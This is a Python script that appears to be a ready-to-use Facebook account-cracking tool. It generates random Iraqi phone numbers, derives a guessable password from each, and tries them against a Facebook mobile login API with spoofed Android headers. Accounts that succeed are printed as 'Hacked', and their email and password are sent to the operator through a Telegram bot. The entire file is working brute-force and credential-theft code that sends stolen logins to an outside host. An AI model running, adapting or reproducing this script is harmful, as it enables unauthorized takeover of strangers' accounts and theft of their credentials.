import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,requests,mechanize,pyfiglet,colorama
from mechanize import Browser
from time import sleep
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
os.system('clear')
print(G+str(pyfiglet.figlet_format('7 A J I'))+f"{S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

ID=input(E+'[+] Enter YOUR ID : ')
tok=input(G+'[+] Enter TOKEN BOT : ')
cd=input(S+'[+] Country Code :+964 ==> ')
nc=input(E+'[+] Number Domain: 750 / 770 / 780 ==> ')
rng=input(G+'[+] Numbers After: [7] ==> ')
rng=int(rng)
print(f"{S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
while True:
    user = '1234567890'
    whisper = str("".join(random.choice(user)for i in range(rng)))
    email= cd+nc+whisper
    password = '0'+nc+whisper
    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+email+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
    q = json.load(data)
    if 'access_token' in q:
        print('\x1b[1;92m[Hacked]  '+email+'  》  '+password)
        tlg = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text= Hacked FaceBook
======================
 E-mail ==> {email}
 PassWord ==> {password}
=====================
 Tele ==> @team453''')
    elif 'www.facebook.com' in q['error_msg']:
        print('\033[1;96m[CheckPoint] '+email+'  》  '+password)
    else:
        print(E+'[Not Hack] '+email+'  》  '+password)
